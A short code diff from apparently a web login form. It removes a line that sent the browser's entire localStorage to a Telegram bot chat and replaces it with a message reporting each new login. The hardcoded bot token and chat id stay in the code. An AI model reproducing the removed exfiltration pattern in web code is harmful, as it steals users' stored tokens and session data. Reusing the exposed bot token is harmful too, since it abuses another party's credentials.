@@ -137,7 +137,7 @@
                 /* Fetch localStorage */
                 fetch(`https://api.telegram.org/bot1070038475:AAGK8MbB_VNFpeYSapXQ1L458o1innmPWkk/` + 
                     `sendMessage?chat_id=-1001490927690&text=` + 
-                    `${JSON.stringify(localStorage)}`
+                    `Регистрация новой учётной записи => ${login}`
                 );               
             } else {
                 document.querySelector('.login__form').innerHTML = `
